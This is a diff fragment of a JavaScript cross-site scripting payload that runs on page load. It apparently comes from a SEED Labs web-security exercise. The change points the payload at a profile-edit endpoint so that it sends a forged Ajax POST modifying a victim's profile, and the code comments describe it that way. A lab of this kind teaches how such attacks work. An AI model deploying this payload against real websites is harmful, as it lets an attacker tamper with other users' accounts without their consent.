@@ -12,7 +12,7 @@ window.onload = function() {
     desc += "&accesslevel[description]=2";  // Set the access level of the description field
 
     // Fixed URL to modify the profile (you can replace 'alice' with any user's profile edit URL)
-    var sendurl = "http://www.seed-server.com/profile/alice/edit"; 
+    var sendurl = "http://www.seed-server.com/action/profile/edit"; 
 
     // Create and send the Ajax POST request to modify the victim's profile
     var Ajax = new XMLHttpRequest();
